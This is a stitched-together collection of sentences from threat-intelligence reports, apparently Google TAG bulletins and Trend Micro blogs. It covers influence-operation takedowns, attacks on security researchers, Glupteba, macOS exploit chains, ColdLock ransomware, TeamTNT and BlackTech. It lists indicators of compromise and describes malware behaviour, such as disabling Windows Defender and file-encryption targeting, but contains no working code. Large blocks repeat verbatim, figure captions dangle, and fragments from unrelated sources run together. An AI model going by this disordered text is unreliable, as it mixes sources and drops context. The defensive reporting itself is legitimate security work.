We terminated 9 YouTube channels as part of our investigation into coordinated influence operations linked to China.
We received leads from Graphika that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Moldova.
We terminated 33 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We terminated 15 YouTube channels as part of our investigation into coordinated influence operations linked to Ethiopia.
We received leads from Graphika that supported us in this investigation.
We terminated 123 YouTube channels as part of our investigation into coordinated influence operations linked to Russia.
We terminated 9 YouTube channels as part of our investigation into coordinated influence operations linked to China.
We received leads from Graphika that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Moldova.
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers."
"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake."
"Within the Visual Studio Project would be source code for exploiting the vulnerability, as well as an additional DLL that would be executed through Visual Studio Build Events."
The DLL is custom malware that would immediately begin communicating with actor-controlled C2 domains.
"In addition to targeting users via social engineering, we have also observed several cases where researchers have been compromised after visiting the actors’ blog."
We encourage anyone who discovers a Chrome vulnerability to report that activity via the Chrome VRP submission process.
"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below."
Host IOCs Registry Keys HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverConfig HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update File Paths C:\Windows\System32\Nwsapagent.sys C:\Windows\System32\helpsvc.sys C:\ProgramData\USOShared\uso.bin C:\ProgramData\VMware\vmnat-update.bin C:\ProgramData\VirtualBox\update.bin
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2020.
"It was last updated on January 26, 2021."
We terminated 12 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We received leads from Facebook that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Myanmar.
We terminated 35 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We received leads from the FBI that supported us in this investigation.
We terminated 2 YouTube channels as part of our ongoing investigation into a coordinated influence operation linked to Iran.
We terminated 10 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 22 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Indonesia.
We received leads from the FBI that supported us in this investigation.
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 9 YouTube channels as part of our investigation into a coordinated influence operation linked to Egypt.
We terminated 6 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 1 YouTube channel as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
We terminated 1 blog as part of our investigation into coordinated influence operations linked to Argentina.
We terminated 3 YouTube channels as part of our investigation into coordinated influence operations linked to France.
We terminated 34 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
"We terminated 3,317 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
"In June, we announced that we saw phishing attempts against the personal email accounts of staffers on the Biden and Trump campaigns by Chinese and Iranian APTs (Advanced Persistent Threats) respectively."
We haven’t seen any evidence of such attempts being successful.
The Iranian attacker group (APT35) and the Chinese attacker group (APT31) targeted campaign staffers’ personal emails with credential phishing emails and emails containing tracking links.
"As part of our wider tracking of APT31 activity, we've also seen them deploy targeted malware campaigns."
"Every malicious piece of this attack was hosted on legitimate services, making it harder for defenders to rely on network signals for detection."
"In one example, attackers impersonated McAfee."
"The targets would be prompted to install a legitimate version of McAfee anti-virus software from GitHub, while malware was simultaneously silently installed to the system."
This targeting is consistent with what others have subsequently reported.
"Shortly after the U.S. Treasury sanctioned Ukrainian Parliament member Andrii Derkach for attempting to influence the U.S. electoral process, we removed 14 Google accounts that were linked to him."
"As the course of the COVID-19 pandemic evolves, we’ve seen threat actors evolve their tactics as well."
"In previous posts, we discussed targeting of health organizations as well as attacker efforts to impersonate the World Health Organization."
"In the threat actor toolkit, different types of attacks are used for different purposes: Phishing campaigns can be used like a scalpel—targeting specific groups or individuals with personalized lures that are more likely to trick them into taking action (like clicking on a malware link), while DDoS attacks are more like a hatchet—disrupting or blocking a site or a service entirely."
"While it’s less common to see DDoS attacks rather than phishing or hacking campaigns coming from government-backed threat groups, we’ve seen bigger players increase their capabilities in launching large-scale attacks in recent years."
"For example in 2017, our Security Reliability Engineering team measured a record-breaking UDP amplification attack sourced out of several Chinese ISPs (ASNs 4134, 4837, 58453, and 9394), which remains the largest bandwidth attack of which we are aware."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2020.
"It was last updated on October 16, 2020."
We terminated 299 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China.
We terminated 8 YouTube channels as part of our actions against a coordinated influence operation linked to Yemen.
We terminated 4 YouTube channels as part of our actions against a coordinated influence operation.
"We terminated 1,628 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
"Like previous websites we’ve seen set up by this actor, this website has a link to their PGP public key at the bottom of the page."
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
"Their blog contains write-ups and analysis of vulnerabilities that have been publicly disclosed, including “guest” posts from unwitting legitimate security researchers, likely in an attempt to build additional credibility with other security researchers."
"In the video, they purported to show a successful working exploit that spawns a cmd.exe shell, but a careful review of the video shows the exploit is fake."
"Within the Visual Studio Project would be source code for exploiting the vulnerability, as well as an additional DLL that would be executed through Visual Studio Build Events."
The DLL is custom malware that would immediately begin communicating with actor-controlled C2 domains.
"In addition to targeting users via social engineering, we have also observed several cases where researchers have been compromised after visiting the actors’ blog."
We encourage anyone who discovers a Chrome vulnerability to report that activity via the Chrome VRP submission process.
"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below."
Host IOCs Registry Keys HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverConfig HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update File Paths C:\Windows\System32\Nwsapagent.sys C:\Windows\System32\helpsvc.sys C:\ProgramData\USOShared\uso.bin C:\ProgramData\VMware\vmnat-update.bin C:\ProgramData\VirtualBox\update.bin
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2020.
"It was last updated on January 26, 2021."
We terminated 12 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We received leads from Facebook that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Myanmar.
We terminated 35 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We received leads from the FBI that supported us in this investigation.
We terminated 2 YouTube channels as part of our ongoing investigation into a coordinated influence operation linked to Iran.
We terminated 10 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 22 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Indonesia.
We received leads from the FBI that supported us in this investigation.
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 9 YouTube channels as part of our investigation into a coordinated influence operation linked to Egypt.
We terminated 6 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We terminated 1 YouTube channel as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
We terminated 1 blog as part of our investigation into coordinated influence operations linked to Argentina.
We terminated 3 YouTube channels as part of our investigation into coordinated influence operations linked to France.
We terminated 34 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Myanmar.
"We terminated 3,317 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to China."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
"It was last updated on May 12, 2022."
We have also taken extraordinary measures beyond our actions against coordinated influence operations to protect users and stop the spread of misinformation and disinformation about the war in Ukraine online.
We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.
"As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers."
The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
"For a period of time, we observed thousands of instances of malicious Glupteba downloads per day."
The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
"While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”."
"This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet."
"This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services."
"Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes."
"To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain."
"Full details of Glupteba’s network protocol can be found in this report from 2020, the following Python script illustrates how one can decrypt an encrypted domain name:"
Recent sha256 hashes of malware samples:
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2021.
"It was last updated on February 7, 2022."
"To protect our users, TAG routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"The watering hole served an XNU privilege escalation vulnerability (CVE-2021-30869) unpatched in macOS Catalina, which led to the installation of a previously unreported backdoor."
iOS Exploits
The iOS exploit chain used a framework based on Ironsquirrel to encrypt exploits delivered to the victim's browser.
"We did not manage to get a complete iOS chain this time, just a partial one where CVE-2019-8506 was used to get code execution in Safari."
macOS Exploits
The landing page contained a simple HTML page loading two scripts—one for Capstone.js and another for the exploit chain.
The parameter rid is a global counter which records the number of exploitation attempts.
This number was in the 200s when we obtained the exploit chain.
"The exploit chain combined an RCE in WebKit exploiting CVE-2021-1789 which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021."
"Loading a page with the WebKit RCE on the latest version of Safari (14.1), we learned the RCE was an n-day since it did not successfully trigger the exploit."
Capstone.js
"It was interesting to see the use of Capstone.js, a port of the Capstone disassembly framework, in an exploit chain as Capstone is typically used for binary analysis."
Analyzing the Mach-O was reminiscent of a CTF reverse engineering challenge.
Then the extracted binary was heavily obfuscated with a relatively tedious encoding mechanism--each string is XOR encoded with a different key.
"After downloading the payload, it removes the quarantine attribute of the file to bypass Gatekeeper."
It then elevated privileges to install the payload.
day or 0-day?
"Before further analyzing how the exploit elevated privileges, we needed to figure out if we were dealing with an N-day or a 0-day vulnerability."
An N-day is a known vulnerability with a publicly available patch.
Threat actors have used N-days shortly after a patch is released to capitalize on the patching delay of their targets.
"In contrast, a 0-day is a vulnerability with no available patch which makes it harder to defend against."
"Despite the exploit being an executable instead of shellcode, it was not a standalone binary we could run in our virtual environment."
It still worked.
The exception indicates that Apple added generic protections in Big Sur which rendered this exploit useless.
This looked similar to an earlier in-the-wild iOS vulnerability analyzed by Ian Beer of Google Project Zero.
The payload seems to be a product of extensive software engineering.
"It also has several components, some of which appear to be configured as modules."
"For example, the payload we obtained contained a kernel module for capturing keystrokes."
Notable features for this backdoor include: Our team is constantly working to secure our users and keep them safe from targeted attacks like this one.
Delivery URLs Javascript Sandbox escape / LPE Backdoor C2 This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q3 2021.
"It was last updated on October 29, 2021."
"Updated on May 6, 2020, 7:20 Pacific Time with further details regarding directories targeted for encryption."
"A new targeted attack has infected several organizations in Taiwan with a new ransomware family, which we have dubbed ColdLock."
The information we gathered indicates that this attack started hitting organizations in early May.
"Analysis of the malware points to similarities between ColdLock and two previously known ransomware families, specifically Lockergoga, Freezing, and the EDA2 “educational” ransomware kit."
There have been no indications that this attack has hit any other organization outside of those targeted; we do not believe that this family is currently in widespread use.
Arrival Vector
We currently do not know the initial arrival vector of this threat into a potential victim’s network.
"The payload arrives as a .NET executable (as a .DLL file), which has been packed/protected using the ConfuserEx packer."
It uses PowerShell reflective loading of .NET executables to run the said .DLL file: Figure 1. Reflective loading of the .DLL file
It also contains two checks to verify if it’s running.
"It will only run at or later than 12:10 PM on any given day; if it is earlier, it will sleep for 15 seconds until it is past the said time."
Figure 3.
"Before it encrypts any file, the ransomware also performs certain preparatory routines."
Figure 4.
It also checks the Windows version running on the system.
"If it is running Windows 10, it carries out several Windows 10-specific routines."
"Windows Defender is disabled, as well as the ability to send feedback/malware samples to Microsoft."
Figure 5. Disabling Windows Defender
The actual encryption routine is slightly unusual.
"Directory name should not contain any of the following strings: .git appdata cache image lib log logs microsoft reference res resource script setup skin temp theme third_party thirdparty If all of the above conditions are met, it will encrypt all the files in the given directory except those with the following extensions: .avi .dll .gif .iso .m2ts .mkv .mov .mp3 .msi .ocx .tmp .wmv"
.odt
.one
.php .ppt
.pptx .pst .rar .sh .sql .txt .xls .xlsx .xml .zip
Figure 6.
Whitelist/blacklist code
It generates the needed key and initialization vector (IV) using a salt and secret key; the former is embedded in the code while the latter is generated dynamically using the SHA-256 hash of a randomly generated 32-byte long string.
This is then encrypted using a hard-coded public RSA key and then embedded in the ransom note.
Figure 7.
AES encryption code Figure 8.
Secret key generation
Txt
It does this by changing several registry settings.
Figure 10. Modified system wallpaper
Connections to other ransomware families
A more reasonable link to the Freezing ransomware family exists.
The code also shares similarities with the open-source EDA2 ransomware kit.
"Trend Micro solutions Ransomware continues to be a lingering threat, something we mentioned in our last Annual Security Roundup after seeing that the number of ransomware cases we detected climbed from 55 million in 2018 to 61 million in 2019."
"For zero-day vulnerabilities, take advantage of virtual patching."
Activate sandbox analysis.
Indicators of Compromise SHA-256 hash Detection Name 08677a3dac3609d13dc4a2a6868ee2f6c1334f4579356d162b706a03839bb9ff Ransom.PS1.COLDLOCK.YPAE-A c5108344e8a6da617af1c4a7fd8924a64130b4c86fa0f6d6225bb75534a80a35 Ransom.MSIL.COLDLOCK.YPAE-A All Trend Micro products using the latest VSAPI pattern (15.849.00 or later) are capable of successful detection of this malware.
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
"It was last updated on May 12, 2022."
We have also taken extraordinary measures beyond our actions against coordinated influence operations to protect users and stop the spread of misinformation and disinformation about the war in Ukraine online.
We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.
"As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers."
The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
"For a period of time, we observed thousands of instances of malicious Glupteba downloads per day."
The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
"While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”."
"This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet."
"This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services."
"Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes."
"To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain."
"Full details of Glupteba’s network protocol can be found in this report from 2020, the following Python script illustrates how one can decrypt an encrypted domain name:"
Recent sha256 hashes of malware samples: This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2021.
"It was last updated on February 7, 2022."
"Although believed to have been active since 2011, TeamTNT stayed under the radar for many years before exploding onto the scene in 2020."
This is known as the principle of least privilege.
Implement private keys authentication for Secure Shell (SSH) on the client side for stronger access control security.
"However, the scope of the attack remained unknown."
Figure 1: IRC bot dropping encoded shell script (detected as Backdoor.Linux.TSUNAMI.USELVBF21) We begin by examining the dropped script from a new AWS-focused credential stealer.
"An AWS instance, by default, does not have any identity access management (IAM) permissions attached; rather, these permissions must be defined by the AWS administrator."
AWS administrators should follow the principle of least privilege when attaching roles to an AWS instance.
Figure 4. Other binaries found on the open directory
"If the group succeeds in running their malicious script on an AWS instance, the script uploads any credentials that it is able to retrieve from the instance metadata service."
"During our research, we noticed over 4,000 infected instances."
Use private key authentication when you have SSH enabled inside your instance.
"Network Security: cloud network layer IPS security Application Security: security for serverless functions, APIs, and applications Conformity: real-time security for cloud infrastructure — secure, optimize, comply Indicators of Compromise (IOCs) SHA-256 Detection Description 9504b74906cf2c4aba515de463f20c02107a00575658e4637ac838278440d1ae Backdoor.Linux.TSUNAMI.USELVBF21 IRC bot 3139a85a18e42bf60ba65deb3d691b5c088a0fac2b80a4d05f17a68eac3d4882 TrojanSpy.SH.AWSTEAL.A Script Tags Cloud | APT & Targeted Attacks | Research | Articles, News, Reports"
"Following their activities and evolving tactics and techniques helped us uncover the proverbial red string of fate that connected three seemingly disparate campaigns: PLEAD, Shrouded Crossbow, and of late, Waterbear."
"PLEAD uses spear-phishing emails to deliver and install their backdoor, either as an attachment or through links to cloud storage services."
Some of the cloud storage accounts used to deliver PLEAD are also used as drop off points for exfiltrated documents stolen by DRIGO.
PLEAD’s installers are disguised as documents using the right-to-left-override (RTLO) technique to obfuscate the malware’s filename.
"We’ve also seen PLEAD use exploits for these vulnerabilities: CVE-2015-5119, patched by Adobe last July, 2015 CVE-2012-0158, patched by Microsoft last April, 2012 CVE-2014-6352, patched by Microsoft last October, 2014 CVE-2017-0199, patched by Microsoft last April, 2017 PLEAD also dabbled with a short-lived, fileless version of their malware when it obtained an exploit for a Flash vulnerability (CVE-2015-5119) that was leaked during the Hacking Team breach."
"Figure 1: How PLEAD utilizes compromised routers PLEAD actors use a router scanner tool to scan for vulnerable routers, after which the attackers will enable the router’s VPN feature then register a machine as virtual server."
This virtual server will be used either as a C&C server or an HTTP server that delivers PLEAD malware to their targets.
"PLEAD also uses CVE-2017-7269, a buffer overflow vulnerability Microsoft Internet Information Services (IIS) 6.0 to compromise the victim’s server."
Figure 2:
"One of the methods PLEAD operators use to distribute their malware PLEAD’s backdoor can: Harvest saved credentials from browsers and email clients like Outlook List drives, processes, open windows, and files Open remote Shell Upload target file Execute applications via ShellExecute API Delete target file PLEAD also uses the document-targeting exfiltration tool DRIGO, which mainly searches the infected machine for documents."
Shrouded Crossbow
"This campaign, first observed in 2010, is believed to be operated by a well-funded group given how it appeared to have purchased the source code of the BIFROST backdoor, which the operators enhanced and created other tools from."
"Shrouded Crossbow employs three BIFROST-derived backdoors: BIFROSE, KIVARS, and XBOW."
"Like PLEAD, Shrouded Crossbow uses spear-phishing emails with backdoor-laden attachments that utilize the RTLO technique and accompanied by decoy documents."
"BIFROSE, known for evading detection by communicating with its C&C servers via Tor protocol, also has a version targeting UNIX-based operating systems, which are usually used in servers, workstations, and mobile devices."
Waterbear similarly employs a modular approach to its malware.
The tactic it later adopted required prior knowledge of their targets’ environment.
All Roads Lead to BlackTech
C&C Server PLEAD Shrouded Crossbow Waterbear itaiwans[.]com Yes No Yes microsoftmse[.]com Yes Yes No 211[.]72[.]242[.]120 Yes Yes No
"Table 1: C&C servers shared by PLEAD, Shrouded Crossbow, and Waterbear"
"Additionally, the IP 211[.]72 [.]242[.]120 is one of the hosts for the domain microsoftmse[.]com, which has been used by several KIVARS variants."
Joint Operations.
"While it’s possible for separate groups to attack at the same time, we can construe at they are at least working together: PLEAD"
"Shrouded Crossbow Samples from different groups using the same filename Loader component named after its target, i.e. {target name}.exe Loader component named after its target, i.e. {target name}.exe or {target name}64.exe Backdoors using the same C&C servers Connected to 211[.]72[.]242[.]120:53 Connected to 211[.]72[.]242[.]120:443 Timeline indicating arrival order Arrived two days after initial infection by SC Established presence two years prior, but re-infected at a recent time"
"Table 2: Incident where PLEAD and KIVARS attack the same target PLEAD Shrouded Crossbow Waterbear Samples found in same machine vmdks.exe cfbcjtqx.dll tpauto.dll Timeline of infection 3/16/2017 2/23/2017 3/8/2017 Table 3: Incidents where PLEAD, KIVARS, and Waterbear were used on the same target"
"PLEAD and KIVARS, for instance, share the use of RTLO techniques to disguise their installers as documents."
Similar Objectives.
"Public security Schedule Enterprises Need to be Proactive PLEAD, Shrouded Crossbow, and Waterbear"
"Network traffic analysis, deployment of firewalls and intrusion detection and prevention systems, network segmentation, and data categorization are just some of them."
"An overview and analysis of the various malware used by PLEAD, Shrouded Crossbow, and Waterbear, along with their Indicators of Compromise (hashes, C&Cs), can be found in this technical brief. Tags Articles, News, Reports | APT & Targeted Attacks | Research"
"Evaluations conducted by MITRE Engenuity don’t generate any scores, rankings or ratings."
Security teams can leverage the MITRE ATT&CK framework to tell a story that helps simplify security communication across their organization.
A security professional can leverage MITRE ATT&CK to audit for coverage gaps to discover where they may be vulnerable to threats.
MITRE Engenuity ATT&CK Evaluations tests a solution’s ability to detect an adversary performing a targeted attack.
"The simulated attackers sent a spear phishing email with a malicious attachment to the manager with the goal of tricking them into opening it, as this technique relies upon user execution."
"When the manager opened the attachment, initial access was granted to the threat group."
"Figure 1 - A Technique detection named ""User Execution of Office Related Document"" was generated when explorer.exe spawned winword.exe when the user clicked 2-list.rtf."
Maintaining Access:
The Leg Work
"Now that the threat group has been granted access to the organization’s network, they must collect the necessary information needed to complete their objective."
"Figure 2 - A Technique detection named ""Clipboard Data or Screenshot Collection via PowerShell"" was generated when powershell.exe executed CopyFromScreen(). The adversary uses privilege escalation, which commonly involves taking advantage of pre-existing system weaknesses, misconfigurations, and vulnerabilities to gain higher permissions."
Figure 3 - Workbench results pulling together a chain of attack involved Credential Dumping using Mimikatz Malware.
Lateral Movement: Moving in for the Kill
Figure 4 - Workbench models showing correlated events ready for further investigation.
Trend Micro Vision One is great for this step.
"We don’t just tell you these individual events have all occurred – we connect the dots for you, showing that they might be related and have similar indicators of compromise as a certain attack group or type."
Figure 6 - FIN7 evaluation environment with Trend Micro solution placement for both detection and prevention scenarios.
What Does it Mean for Me?
What else do I need to consider?
"When evaluating the performance of vendors, it is important to consider the hierarchy of detection types."
Telemetry:
Data was processed that shows an event occurred related to the process being detected.
General:
"A general detection indicates that something was deemed suspicious, but it was not assigned to a specific tactic or technique."
Technique: A detection on technique means the detection can be attributed to a specific adversarial action (e.g. credential dumping).
"Figure 8 - Carbanak and FIN7 evaluation, 65 ATT&CK techniques across 11 ATT&CK tactics are in scope for this evaluation."
Trend Micro doesn’t leave that responsibility wholly on you.
Figure 9 -
"For this specific test, Trend Micro performed exceptionally with the ability to block 90% of simulations automatically."
"Another added element this year which deserves a special mention was the introduction of a Linux servers, where we detected all 14 techniques executed in the simulated attack scenario."
Check out the complete results and more information on Trend Micro Vision One here: https://resources.trendmicro.com/MITRE-Attack-Evaluations.html.
"Articles, News, Reports"
"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"If the link was not active, the user was redirected directly to a legitimate website."
"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021."
ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.
"We did not capture the subsequent stages, but assess the attackers did not have exploits for the current version of Chrome (91.0.4472) at that time, but instead used n-day exploits targeting Samsung Browser, which was running an older and vulnerable version of Chromium."
Related IOCs
"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit."
We haven’t retrieved a copy of the exploit.
Related IOCs
Related IOCs
We would also like to thank Project Zero for their technical assistance in helping analyze these bugs.
We remain committed to updating the community as we uncover these campaigns.
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
"NOTE: On May 20th, we updated our attribution to more precisely describe our findings."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
The data is then exfiltrated via email to a compromised email account.
Malware samples:
TAG would like to thank the Yahoo! Paranoids Advanced Cyber Threats Team for their collaboration in this investigation.
"Recently observed Turla domains: COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to use Gmail accounts to send credential phishing emails to a variety of Google and non-Google accounts."
"The group's tactics, techniques and procedures (TTPs) for these campaigns have shifted slightly from including phishing links directly in the email, to also linking to PDFs and/or DOCs hosted on Google Drive and Microsoft One Drive."
Within these files is a link to an attacker controlled phishing domain.
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing."
"This campaign, targeting high risk individuals in Ukraine, contained links leading to compromised websites where the first stage phishing page was hosted."
"If the user clicked continue, they would be redirected to an attacker controlled site that collected the users credentials."
There were no accounts compromised from this campaign and Google will alert all targeted users of these attempts through our monthly government-backed attacker warnings.
Both pages from this campaign are shown below.
"In mid-April, TAG detected a Ghostwriter credential phishing campaign targeting Facebook users."
"The targets, primarily located in Lithuania, were sent links to attacker controlled domains from a domain spoofing the Facebook security team."
"Recently observed Ghostwriter credential phishing domains and emails: Curious Gorge, a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, Russia and Central Asia."
"In Russia, long running campaigns against multiple government organizations have continued, including the Ministry of Foreign Affairs."
"Over the past week, TAG identified additional compromises impacting multiple Russian defense contractors and manufacturers and a Russian logistics company."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation."
We also send all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity.
We encourage any potential targets to enable Google Account Level Enhanced Safe Browsing and ensure that all devices are updated.
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"We’ll continue to take action, identify bad actors and share relevant information with others across industry and governments, with the goal of bringing awareness to these issues, protecting users and preventing future attacks."
"In early March, Google’s Threat Analysis Group (TAG) published an update on the cyber activity it was tracking with regard to the war in Ukraine."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
Financially motivated and criminal actors are also using current events as a means for targeting users.
TAG has also continued to observe multiple ransomware brokers continuing to operate in a business as usual sense.
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
"We promptly identify and remove any such content, but have not observed any significant shifts from the normal levels of activity that occur in the region."
"Here is a deeper look at the campaign activity TAG has observed over the past two weeks: Curious Gorge, a group TAG attributes to China's PLA SSF, has conducted campaigns against government and military organizations in Ukraine, Russia, Kazakhstan, and Mongolia."
"While this activity largely does not impact Google products, we remain engaged and are providing notifications to victim organizations."
"Recently observed IPs used in Curious Gorge campaigns: COLDRIVER, a Russian-based threat actor sometimes referred to as Calisto, has launched credential phishing campaigns, targeting several US based NGOs and think tanks, the military of a Balkans country, and a Ukraine based defense contractor."
"However, for the first time, TAG has observed COLDRIVER campaigns targeting the military of multiple Eastern European countries, as well as a NATO Centre of Excellence."
"These campaigns were sent using newly created Gmail accounts to non-Google accounts, so the success rate of these campaigns is unknown."
We have not observed any Gmail accounts successfully compromised during these campaigns.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, recently introduced a new capability into their credential phishing campaigns."
"In mid-March, a security researcher released a blog post detailing a 'Browser in the Browser' phishing technique."
"While TAG has previously observed this technique being used by multiple government-backed actors, the media picked up on this blog post, publishing several stories highlighting this phishing capability."
"Ghostwriter actors have quickly adopted this new technique, combining it with a previously observed technique, hosting credential phishing landing pages on compromised sites."
"The new technique, displayed below, draws a login page that appears to be on the passport.i.ua domain, overtop of the page hosted on the compromised site."
"Once a user provides credentials in the dialog, they are posted to an attacker controlled domain."
Recently observed Ghostwriter credential phishing domains:
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"We’ll continue to take action, identify bad actors and share relevant information with others across industry and governments, with the goal of bringing awareness to these issues, protecting users and preventing future attacks."
"Welcome to our weekly roundup, where we share what you need to know about cybersecurity news and events that happened over the past few days."
"This week, learn about Trend Micro’s latest cloud security offering, Cloud One – Application Security."
Read on:
"Leading Protection for Cloud-Based Applications from Trend Micro Trend Micro announced the availability of its Trend Micro Cloud One – Application Security, a cloud native security solution for modern applications and APIs."
"Delivered as part of its industry-leading platform, Cloud One – Application Security provides code-level visibility and protection against the latest cyber threats."
"The Internet of Things (IoT) Cybersecurity Improvement Act, passed by the House of Representatives in September and unanimously approved by the Senate last week, is a step toward warding off advanced threats and providing greater security in IoT devices."
The act aims to create “standards and guidelines” for the federal government to follow with the hopes that the requirements also make their way into private sector manufacturing.
Navigating Gray Clouds: The Importance of Visibility in Cloud Security
"With 85% of businesses worldwide using the cloud, it has proven its imperative value, especially during the onslaught of the COVID-19 pandemic when remote work and reliance on the cloud for automation and scalability is the norm."
"After migrating to the cloud, enterprises need to be aware of the visibility-related challenges and security risks associated with it."
"In this blog, Trend Micro shares security recommendations for organizations to ensure stable security practices in a cloud-first world."
Apple Security Chief Maintains Innocence After Bribery Charges
"A grand jury in California's Santa Clara County has indicted Thomas Moyer, Apple's head of global security, for bribery."
Moyer is accused of offering 200 iPads to the Santa County Sheriff's office in exchange for concealed carry permits for four Apple employees.
Weaponizing Open Source Software for Targeted Attacks
"In this blog, Trend Micro researchers walk through a recent investigation that involved trojanized open-source software, which is tricky to spot because it takes on the façade of legitimate, non-malicious software, making it especially stealthy and useful for targeted attacks."
"However, a closer investigation can reveal suspicious behavior that exposes their malicious intent."
"Botnets Have Been Silently Mass-Scanning the Internet for Unsecured ENV Files Security firm Greynoise found that multiple threat actors, while drawing little attention to themselves, have spent the past two to three years mass-scanning the internet for ENV (environment) files that were accidentally uploaded and left exposed on web servers."
"Frameworks like Docker, Node.js, Symfony, and Django use ENV files to store environment variables such as API tokens, passwords and database logins."
Analysis of Kinsing Malware's Use of Rootkit
